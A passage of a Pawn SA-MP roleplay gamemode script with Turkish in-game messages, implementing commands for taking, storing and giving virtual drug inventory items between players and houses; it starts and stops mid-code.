			SendClientMessageEx(playerid,-1, ""C2"[UYUÞTURUCULAR] "C1"Eroin: ["C2"%d"C1"] Morfin: ["C2"%d"C1"] MDA: ["C2"%d"C1"]",EvUyusturucu[mesafe][eroin], EvUyusturucu[mesafe][morfin], EvUyusturucu[mesafe][MDA]);
		}
		else if(!strcmp(string, "eval", true))
		{
		    new mesafe = EvIceridenMesafesi(playerid);
        	if(mesafe == 0) return Hata(playerid, "Evin içerisinde deðilsiniz.");
        	if(Ev[mesafe][esahip] != Karakter[playerid][sqlid] && Ev[mesafe][kiralayan] != Karakter[playerid][sqlid] && !EvAnahtarKontrol(playerid, mesafe)) return Hata(playerid, "Bu evden uyuþturucu alamazsýnýz.");
		    new tmp[128];
		    tmp = strtok(cmdtext, idx);
		    if(!strlen(tmp))
		    {
		        Kullanim(playerid, "/uyusturucu eval [uyuþturucu çeþiti] [miktar]");
		        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
		        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
				return 1;
			}
			if(!strcmp(tmp, "esrar", true))
			{
			    tmp = strtok(cmdtext, idx);
			    if(strval(tmp) <= 0) {
                    Kullanim(playerid, "/uyusturucu eval [uyuþturucu çeþiti] [miktar]");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
		        	return 1;
				}
			    if(EvUyusturucu[mesafe][uesrar] >= strval(tmp))
			    {
			        Karakter[playerid][uesrar] += strval(tmp);
			        EvUyusturucu[mesafe][uesrar] -= strval(tmp);
			        format(tmp, sizeof(tmp), "Evden %d miktar esrar aldýnýz.", strval(tmp));
			        Bilgi(playerid, tmp);
					EvKaydet(mesafe);
				}
				else
				{
					Hata(playerid, "Evde yeterli esrar bulunmamakta.");
				}
			}
			else if(!strcmp(tmp, "amfetamin", true))
			{
				tmp = strtok(cmdtext, idx);
			    if(strval(tmp) <= 0) {
                    Kullanim(playerid, "/uyusturucu eval [uyuþturucu çeþiti] [miktar]");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
		        	return 1;
				}
			    if(EvUyusturucu[mesafe][amfetamin] >= strval(tmp))
			    {
			        Karakter[playerid][amfetamin] += strval(tmp);
			        EvUyusturucu[mesafe][amfetamin] -= strval(tmp);
			        format(tmp, sizeof(tmp), "Evden %d miktar amfetamin aldýnýz.", strval(tmp));
			        Bilgi(playerid, tmp);
					EvKaydet(mesafe);
				}
				else
				{
					Hata(playerid, "Evde yeterli amfetamin bulunmamakta.");
				}
			}
			else if(!strcmp(tmp, "metamfetamin", true))
			{
				tmp = strtok(cmdtext, idx);
			    if(strval(tmp) <= 0) {
                    Kullanim(playerid, "/uyusturucu eval [uyuþturucu çeþiti] [miktar]");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
		        	return 1;
				}
			    if(EvUyusturucu[mesafe][metamfetamin] >= strval(tmp))
			    {
			        Karakter[playerid][metamfetamin] += strval(tmp);
			        EvUyusturucu[mesafe][metamfetamin] -= strval(tmp);
			        format(tmp, sizeof(tmp), "Evden %d miktar metamfetamin aldýnýz.", strval(tmp));
			        Bilgi(playerid, tmp);
					EvKaydet(mesafe);
				}
				else
				{
					Hata(playerid, "Evde yeterli metamfetamin bulunmamakta.");
				}
			}
			else if(!strcmp(tmp, "lsd", true))
			{
				tmp = strtok(cmdtext, idx);
			    if(strval(tmp) <= 0) {
                    Kullanim(playerid, "/uyusturucu eval [uyuþturucu çeþiti] [miktar]");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
		        	return 1;
				}
			    if(EvUyusturucu[mesafe][lsd] >= strval(tmp))
			    {
			        Karakter[playerid][lsd] += strval(tmp);
			        EvUyusturucu[mesafe][lsd] -= strval(tmp);
			        format(tmp, sizeof(tmp), "Evden %d miktar lsd aldýnýz.", strval(tmp));
			        Bilgi(playerid, tmp);
					EvKaydet(mesafe);
				}
				else
				{
					Hata(playerid, "Evde yeterli lsd bulunmamakta.");
				}
			}
			else if(!strcmp(tmp, "extacy", true))
			{
				tmp = strtok(cmdtext, idx);
			    if(strval(tmp) <= 0) {
                    Kullanim(playerid, "/uyusturucu eval [uyuþturucu çeþiti] [miktar]");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
		        	return 1;
				}
			    if(EvUyusturucu[mesafe][extacy] >= strval(tmp))
			    {
			        Karakter[playerid][extacy] += strval(tmp);
			        EvUyusturucu[mesafe][extacy] -= strval(tmp);
			        format(tmp, sizeof(tmp), "Evden %d miktar extacy aldýnýz.", strval(tmp));
			        Bilgi(playerid, tmp);
					EvKaydet(mesafe);
				}
				else
				{
					Hata(playerid, "Evde yeterli extacy bulunmamakta.");
				}
			}
			else if(!strcmp(tmp, "kokain", true))
			{
				tmp = strtok(cmdtext, idx);
			    if(strval(tmp) <= 0) {
                    Kullanim(playerid, "/uyusturucu eval [uyuþturucu çeþiti] [miktar]");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
		        	return 1;
				}
			    if(EvUyusturucu[mesafe][kokain] >= strval(tmp))
			    {
			        Karakter[playerid][kokain] += strval(tmp);
			        EvUyusturucu[mesafe][kokain] -= strval(tmp);
			        format(tmp, sizeof(tmp), "Evden %d miktar kokain aldýnýz.", strval(tmp));
			        Bilgi(playerid, tmp);
					EvKaydet(mesafe);
				}
				else
				{
					Hata(playerid, "Evde yeterli kokain bulunmamakta.");
				}
			}
			else if(!strcmp(tmp, "eroin", true))
			{
				tmp = strtok(cmdtext, idx);
			    if(strval(tmp) <= 0) {
                    Kullanim(playerid, "/uyusturucu eval [uyuþturucu çeþiti] [miktar]");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
		        	return 1;
				}
			    if(EvUyusturucu[mesafe][eroin] >= strval(tmp))
			    {
			        Karakter[playerid][eroin] += strval(tmp);
			        EvUyusturucu[mesafe][eroin] -= strval(tmp);
			        format(tmp, sizeof(tmp), "Evden %d miktar eroin aldýnýz.", strval(tmp));
			        Bilgi(playerid, tmp);
					EvKaydet(mesafe);
				}
				else
				{
					Hata(playerid, "Evde yeterli eroin bulunmamakta.");
				}
			}
			else if(!strcmp(tmp, "morfin", true))
			{
				tmp = strtok(cmdtext, idx);
			    if(strval(tmp) <= 0) {
                    Kullanim(playerid, "/uyusturucu eval [uyuþturucu çeþiti] [miktar]");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
		        	return 1;
				}
			    if(EvUyusturucu[mesafe][morfin] >= strval(tmp))
			    {
			        Karakter[playerid][morfin] += strval(tmp);
			        EvUyusturucu[mesafe][morfin] -= strval(tmp);
			        format(tmp, sizeof(tmp), "Evden %d miktar morfin aldýnýz.", strval(tmp));
			        Bilgi(playerid, tmp);
					EvKaydet(mesafe);
				}
				else
				{
					Hata(playerid, "Evde yeterli morfin bulunmamakta.");
				}
			}
			else if(!strcmp(tmp, "mda", true))
			{
				tmp = strtok(cmdtext, idx);
			    if(strval(tmp) <= 0) {
                    Kullanim(playerid, "/uyusturucu eval [uyuþturucu çeþiti] [miktar]");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
		        	return 1;
				}
			    if(EvUyusturucu[mesafe][MDA] >= strval(tmp))
			    {
			        Karakter[playerid][MDA] += strval(tmp);
			        EvUyusturucu[mesafe][MDA] -= strval(tmp);
			        format(tmp, sizeof(tmp), "Evden %d miktar MDA aldýnýz.", strval(tmp));
			        Bilgi(playerid, tmp);
					EvKaydet(mesafe);
				}
				else
				{
					Hata(playerid, "Evde yeterli MDA bulunmamakta.");
				}
			}
			return 1;
		}
		else if(!strcmp(string, "evbirak", true))
		{
		    new mesafe = EvIceridenMesafesi(playerid);
        	if(mesafe == 0) return Hata(playerid, "Evin içerisinde deðilsiniz.");
        	if(Ev[mesafe][esahip] != Karakter[playerid][sqlid] && Ev[mesafe][kiralayan] != Karakter[playerid][sqlid] && !EvAnahtarKontrol(playerid, mesafe)) return Hata(playerid, "Bu eve uyuþturucu býrakamazsýnýz.");
		    new tmp[128];
		    tmp = strtok(cmdtext, idx);
		    if(!strlen(tmp))
		    {
		        Kullanim(playerid, "/uyusturucu evbirak [uyuþturucu çeþiti] [miktar]");
		        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
		        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
				return 1;
			}
			if(!strcmp(tmp, "esrar", true))
			{
			    tmp = strtok(cmdtext, idx);
			    if(strval(tmp) <= 0) {
                    Kullanim(playerid, "/uyusturucu evbirak [uyuþturucu çeþiti] [miktar]");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
		        	return 1;
				}
			    if(Karakter[playerid][uesrar] >= strval(tmp))
			    {
					EvUyusturucu[mesafe][uesrar] += strval(tmp);
					Karakter[playerid][uesrar] -= strval(tmp);
                    format(tmp, sizeof(tmp), "Eve %d miktar esrar býraktýnýz.", strval(tmp));
			        Bilgi(playerid, tmp);
					EvKaydet(mesafe);
				}
				else
				{
					Hata(playerid, "Üzerinizde yeterli esrar bulunmamakta.");
				}
			}
			else if(!strcmp(tmp, "amfetamin", true))
			{
				tmp = strtok(cmdtext, idx);
			    if(strval(tmp) <= 0) {
                    Kullanim(playerid, "/uyusturucu evbirak [uyuþturucu çeþiti] [miktar]");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
		        	return 1;
				}
			    if(Karakter[playerid][amfetamin] >= strval(tmp))
			    {
			        EvUyusturucu[mesafe][amfetamin] += strval(tmp);
			        Karakter[playerid][amfetamin] -= strval(tmp);
			        format(tmp, sizeof(tmp), "Eve %d miktar amfetamin býraktýnýz.", strval(tmp));
			        Bilgi(playerid, tmp);
					EvKaydet(mesafe);
				}
				else
				{
					Hata(playerid, "Üzerinizde yeterli amfetamin bulunmamakta.");
				}
			}
			else if(!strcmp(tmp, "metamfetamin", true))
			{
				tmp = strtok(cmdtext, idx);
			    if(strval(tmp) <= 0) {
                    Kullanim(playerid, "/uyusturucu evbirak [uyuþturucu çeþiti] [miktar]");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
		        	return 1;
				}
			    if(Karakter[playerid][metamfetamin] >= strval(tmp))
			    {
			        EvUyusturucu[mesafe][metamfetamin] += strval(tmp);
			        Karakter[playerid][metamfetamin] -= strval(tmp);
			        format(tmp, sizeof(tmp), "Eve %d miktar metamfetamin býraktýnýz.", strval(tmp));
			        Bilgi(playerid, tmp);
					EvKaydet(mesafe);
				}
				else
				{
					Hata(playerid, "Üzerinizde yeterli metamfetamin bulunmamakta.");
				}
			}
			else if(!strcmp(tmp, "lsd", true))
			{
				tmp = strtok(cmdtext, idx);
			    if(strval(tmp) <= 0) {
                    Kullanim(playerid, "/uyusturucu evbirak [uyuþturucu çeþiti] [miktar]");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
		        	return 1;
				}
			    if(Karakter[playerid][lsd] >= strval(tmp))
			    {
			        EvUyusturucu[mesafe][lsd] += strval(tmp);
			        Karakter[playerid][lsd] -= strval(tmp);
			        format(tmp, sizeof(tmp), "Eve %d miktar lsd býraktýnýz.", strval(tmp));
			        Bilgi(playerid, tmp);
                    EvKaydet(mesafe);
				}
				else
				{
					Hata(playerid, "Üzerinizde yeterli lsd bulunmamakta.");
				}
			}
			else if(!strcmp(tmp, "extacy", true))
			{
				tmp = strtok(cmdtext, idx);
			    if(strval(tmp) <= 0) {
                    Kullanim(playerid, "/uyusturucu evbirak [uyuþturucu çeþiti] [miktar]");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
		        	return 1;
				}
			    if(Karakter[playerid][extacy] >= strval(tmp))
			    {
			        EvUyusturucu[mesafe][extacy] += strval(tmp);
			        Karakter[playerid][extacy] -= strval(tmp);
			        format(tmp, sizeof(tmp), "Eve %d miktar extacy býraktýnýz.", strval(tmp));
			        Bilgi(playerid, tmp);
					EvKaydet(mesafe);
				}
				else
				{
					Hata(playerid, "Üzerinizde yeterli extacy bulunmamakta.");
				}
			}
			else if(!strcmp(tmp, "kokain", true))
			{
				tmp = strtok(cmdtext, idx);
			    if(strval(tmp) <= 0) {
                    Kullanim(playerid, "/uyusturucu evbirak [uyuþturucu çeþiti] [miktar]");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
		        	return 1;
				}
			    if(Karakter[playerid][kokain] >= strval(tmp))
			    {
                    EvUyusturucu[mesafe][kokain] += strval(tmp);
                    Karakter[playerid][kokain] -= strval(tmp);
			        format(tmp, sizeof(tmp), "Eve %d miktar kokain býraktýnýz.", strval(tmp));
			        Bilgi(playerid, tmp);
					EvKaydet(mesafe);
				}
				else
				{
					Hata(playerid, "Üzerinizde yeterli kokain bulunmamakta.");
				}
			}
			else if(!strcmp(tmp, "eroin", true))
			{
				tmp = strtok(cmdtext, idx);
			    if(strval(tmp) <= 0) {
                    Kullanim(playerid, "/uyusturucu evbirak [uyuþturucu çeþiti] [miktar]");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
		        	return 1;
				}
			    if(Karakter[playerid][eroin] >= strval(tmp))
			    {
			        EvUyusturucu[mesafe][eroin] += strval(tmp);
			        Karakter[playerid][eroin] -= strval(tmp);
			        format(tmp, sizeof(tmp), "Eve %d miktar eroin býraktýnýz.", strval(tmp));
			        Bilgi(playerid, tmp);
					EvKaydet(mesafe);
				}
				else
				{
					Hata(playerid, "Üzerinizde yeterli eroin bulunmamakta.");
				}
			}
			else if(!strcmp(tmp, "morfin", true))
			{
				tmp = strtok(cmdtext, idx);
			    if(strval(tmp) <= 0) {
                    Kullanim(playerid, "/uyusturucu evbirak [uyuþturucu çeþiti] [miktar]");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
		        	return 1;
				}
			    if(Karakter[playerid][morfin] >= strval(tmp))
			    {
			        EvUyusturucu[mesafe][morfin] += strval(tmp);
			        Karakter[playerid][morfin] -= strval(tmp);
			        format(tmp, sizeof(tmp), "Eve %d miktar morfin býraktýnýz.", strval(tmp));
			        Bilgi(playerid, tmp);
					EvKaydet(mesafe);
				}
				else
				{
					Hata(playerid, "Üzerinizde yeterli morfin bulunmamakta.");
				}
			}
			else if(!strcmp(tmp, "mda", true))
			{
				tmp = strtok(cmdtext, idx);
			    if(strval(tmp) <= 0) {
                    Kullanim(playerid, "/uyusturucu evbirak [uyuþturucu çeþiti] [miktar]");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
		        	SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
		        	return 1;
				}
			    if(Karakter[playerid][MDA] >= strval(tmp))
			    {
			        EvUyusturucu[mesafe][MDA] += strval(tmp);
			        Karakter[playerid][MDA] -= strval(tmp);
			        format(tmp, sizeof(tmp), "Eve %d miktar MDA býraktýnýz.", strval(tmp));
			        Bilgi(playerid, tmp);
					EvKaydet(mesafe);
				}
				else
				{
					Hata(playerid, "Üzerinizde yeterli MDA bulunmamakta.");
				}
			}
			return 1;
		}
		else if(!strcmp(string, "ver", true))
		{
		    string = strtok(cmdtext, idx);
		    if(!strlen(string))
		    {
		        Kullanim(playerid, "/uyusturucu ver [playerid] [tür] [miktar]");
		        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
		        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
		        return 1;
		    }
			new giveplayerid = strval(string);
		    if(ProxDetectorS(3.5, playerid, giveplayerid) && playerid != giveplayerid)
		    {
		        string = strtok(cmdtext, idx);
		        if(!strlen(string))
		        {
			        Kullanim(playerid, "/uyusturucu ver [playerid] [tür] [miktar]");
			        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
			        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
			        return 1;
		        }
		        if(!strcmp(string, "esrar", true))
		        {
			        new tur[256];
			        strmid(tur, string, 0, strlen(string));
			        string = strtok(cmdtext, idx);
			        if(!strlen(string))
			        {
				        Kullanim(playerid, "/uyusturucu ver [playerid] [tür] [miktar]");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
				        return 1;
			        }
					new miktar = strval(string);
					if(miktar > 0)
					{
						if(Karakter[playerid][uesrar]-miktar >= 0)
						{
							format(string, sizeof(string), "{CCE6E6}%s size uyuþturucu vermek istiyor.\nUyuþturucu Türü: {FFFFFF}Esrar\n{CCE6E6}Uyuþturucu Gramý: {FFFFFF}%d\nUyuþturucuyu almak istiyor musunuz?", OyuncuAdiniBul(playerid), miktar);
						    ShowPlayerDialog(giveplayerid, 101, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Uyuþturucu Teklifi", string, "Kabul Et", "Reddet");
						    UyusturucuTeklif[giveplayerid] = playerid;
						    UyusturucuTeklifMiktar[giveplayerid] = miktar;
						    return 1;
						}
						else
						{
							Hata(playerid, "Üzerinizde bu kadar esrar bulunmamakta.");
						}
					}
					else
					{
						Hata(playerid, "Geçersiz bir miktar girdiniz.");
					}
				}
		        if(!strcmp(string, "amfetamin", true))
		        {
			        new tur[256];
			        strmid(tur, string, 0, strlen(string));
			        string = strtok(cmdtext, idx);
			        if(!strlen(string))
			        {
				        Kullanim(playerid, "/uyusturucu ver [playerid] [tür] [miktar]");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
				        return 1;
			        }
					new miktar = strval(string);
					if(miktar > 0)
					{
						if(Karakter[playerid][amfetamin]-miktar >= 0)
						{
							format(string, sizeof(string), "{CCE6E6}%s size uyuþturucu vermek istiyor.\nUyuþturucu Türü: {FFFFFF}Amfetamin\n{CCE6E6}Uyuþturucu Gramý: {FFFFFF}%d\nUyuþturucuyu almak istiyor musunuz?", OyuncuAdiniBul(playerid), miktar);
						    ShowPlayerDialog(giveplayerid, 184, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Uyuþturucu Teklifi", string, "Kabul Et", "Reddet");
						    UyusturucuTeklif[giveplayerid] = playerid;
						    UyusturucuTeklifMiktar[giveplayerid] = miktar;
                            return 1;
						}
						else
						{
							Hata(playerid, "Üzerinizde bu kadar amfetamin bulunmamakta.");
						}
					}
					else
					{
						Hata(playerid, "Geçersiz bir miktar girdiniz.");
					}
				}
		        if(!strcmp(string, "metamfetamin", true))
		        {
			        new tur[256];
			        strmid(tur, string, 0, strlen(string));
			        string = strtok(cmdtext, idx);
			        if(!strlen(string))
			        {
				        Kullanim(playerid, "/uyusturucu ver [playerid] [tür] [miktar]");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
				        return 1;
			        }
					new miktar = strval(string);
					if(miktar > 0)
					{
						if(Karakter[playerid][metamfetamin]-miktar >= 0)
						{
							format(string, sizeof(string), "{CCE6E6}%s size uyuþturucu vermek istiyor.\nUyuþturucu Türü: {FFFFFF}Metamfetamin\n{CCE6E6}Uyuþturucu Gramý: {FFFFFF}%d\nUyuþturucuyu almak istiyor musunuz?", OyuncuAdiniBul(playerid), miktar);
						    ShowPlayerDialog(giveplayerid, 185, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Uyuþturucu Teklifi", string, "Kabul Et", "Reddet");
						    UyusturucuTeklif[giveplayerid] = playerid;
						    UyusturucuTeklifMiktar[giveplayerid] = miktar;
						    return 1;
						}
						else
						{
							Hata(playerid, "Üzerinizde bu kadar metamfetamin bulunmamakta.");
						}
					}
					else
					{
						Hata(playerid, "Geçersiz bir miktar girdiniz.");
					}
				}
		        if(!strcmp(string, "lsd", true))
		        {
				        new tur[256];
				        strmid(tur, string, 0, strlen(string));
				        string = strtok(cmdtext, idx);
				        if(!strlen(string))
				        {
					        Kullanim(playerid, "/uyusturucu ver [playerid] [tür] [miktar]");
					        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
					        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
					        return 1;
				        }
						new miktar = strval(string);
						if(miktar > 0)
						{
							if(Karakter[playerid][lsd]-miktar >= 0)
							{
								format(string, sizeof(string), "{CCE6E6}%s size uyuþturucu vermek istiyor.\nUyuþturucu Türü: {FFFFFF}LSD\n{CCE6E6}Uyuþturucu Gramý: {FFFFFF}%d\nUyuþturucuyu almak istiyor musunuz?", OyuncuAdiniBul(playerid), miktar);
							    ShowPlayerDialog(giveplayerid, 186, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Uyuþturucu Teklifi", string, "Kabul Et", "Reddet");
							    UyusturucuTeklif[giveplayerid] = playerid;
							    UyusturucuTeklifMiktar[giveplayerid] = miktar;
							    return 1;
							}
							else
							{
								Hata(playerid, "Üzerinizde bu kadar LSD bulunmamakta.");
							}
						}
						else
						{
							Hata(playerid, "Geçersiz bir miktar girdiniz.");
						}
				}
	        	if(!strcmp(string, "extacy", true))
		        {
			        new tur[256];
			        strmid(tur, string, 0, strlen(string));
			        string = strtok(cmdtext, idx);
			        if(!strlen(string))
			        {
				        Kullanim(playerid, "/uyusturucu ver [playerid] [tür] [miktar]");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
				        return 1;
			        }
					new miktar = strval(string);
					if(miktar > 0)
					{
						if(Karakter[playerid][extacy]-miktar >= 0)
						{
							format(string, sizeof(string), "{CCE6E6}%s size uyuþturucu vermek istiyor.\nUyuþturucu Türü: {FFFFFF}Extacy\n{CCE6E6}Uyuþturucu Gramý: {FFFFFF}%d\nUyuþturucuyu almak istiyor musunuz?", OyuncuAdiniBul(playerid), miktar);
						    ShowPlayerDialog(giveplayerid, 187, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Uyuþturucu Teklifi", string, "Kabul Et", "Reddet");
						    UyusturucuTeklif[giveplayerid] = playerid;
						    UyusturucuTeklifMiktar[giveplayerid] = miktar;
						    return 1;
						}
						else
						{
							Hata(playerid, "Üzerinizde bu kadar extacy bulunmamakta.");
						}
					}
					else
					{
						Hata(playerid, "Geçersiz bir miktar girdiniz.");
					}
				}
	        	if(!strcmp(string, "kokain", true))
		        {
			        new tur[256];
			        strmid(tur, string, 0, strlen(string));
			        string = strtok(cmdtext, idx);
			        if(!strlen(string))
			        {
				        Kullanim(playerid, "/uyusturucu ver [playerid] [tür] [miktar]");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
				        return 1;
			        }
					new miktar = strval(string);
					if(miktar > 0)
					{
						if(Karakter[playerid][kokain]-miktar >= 0)
						{
							format(string, sizeof(string), "{CCE6E6}%s size uyuþturucu vermek istiyor.\nUyuþturucu Türü: {FFFFFF}Kokain\n{CCE6E6}Uyuþturucu Gramý: {FFFFFF}%d\nUyuþturucuyu almak istiyor musunuz?", OyuncuAdiniBul(playerid), miktar);
						    ShowPlayerDialog(giveplayerid, 188, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Uyuþturucu Teklifi", string, "Kabul Et", "Reddet");
						    UyusturucuTeklif[giveplayerid] = playerid;
						    UyusturucuTeklifMiktar[giveplayerid] = miktar;
                            return 1;
						}
						else
						{
							Hata(playerid, "Üzerinizde bu kadar kokain bulunmamakta.");
						}
					}
					else
					{
						Hata(playerid, "Geçersiz bir miktar girdiniz.");
					}
				}
	        	if(!strcmp(string, "eroin", true))
		        {
			        new tur[256];
			        strmid(tur, string, 0, strlen(string));
			        string = strtok(cmdtext, idx);
			        if(!strlen(string))
			        {
				        Kullanim(playerid, "/uyusturucu ver [playerid] [tür] [miktar]");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
				        return 1;
			        }
					new miktar = strval(string);
					if(miktar > 0)
					{
						if(Karakter[playerid][eroin]-miktar >= 0)
						{
							format(string, sizeof(string), "{CCE6E6}%s size uyuþturucu vermek istiyor.\nUyuþturucu Türü: {FFFFFF}Eroin\n{CCE6E6}Uyuþturucu Gramý: {FFFFFF}%d\nUyuþturucuyu almak istiyor musunuz?", OyuncuAdiniBul(playerid), miktar);
						    ShowPlayerDialog(giveplayerid, 189, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Uyuþturucu Teklifi", string, "Kabul Et", "Reddet");
						    UyusturucuTeklif[giveplayerid] = playerid;
						    UyusturucuTeklifMiktar[giveplayerid] = miktar;
						    return 1;
						}
						else
						{
							Hata(playerid, "Üzerinizde bu kadar eroin bulunmamakta.");
						}
					}
					else
					{
						Hata(playerid, "Geçersiz bir miktar girdiniz.");
					}
				}
	        	if(!strcmp(string, "morfin", true))
		        {
			        new tur[256];
			        strmid(tur, string, 0, strlen(string));
			        string = strtok(cmdtext, idx);
			        if(!strlen(string))
			        {
				        Kullanim(playerid, "/uyusturucu ver [playerid] [tür] [miktar]");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
				        return 1;
			        }
					new miktar = strval(string);
					if(miktar > 0)
					{
						if(Karakter[playerid][morfin]-miktar >= 0)
						{
							format(string, sizeof(string), "{CCE6E6}%s size uyuþturucu vermek istiyor.\nUyuþturucu Türü: {FFFFFF}Morfin\n{CCE6E6}Uyuþturucu Gramý: {FFFFFF}%d\nUyuþturucuyu almak istiyor musunuz?", OyuncuAdiniBul(playerid), miktar);
						    ShowPlayerDialog(giveplayerid, 190, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Uyuþturucu Teklifi", string, "Kabul Et", "Reddet");
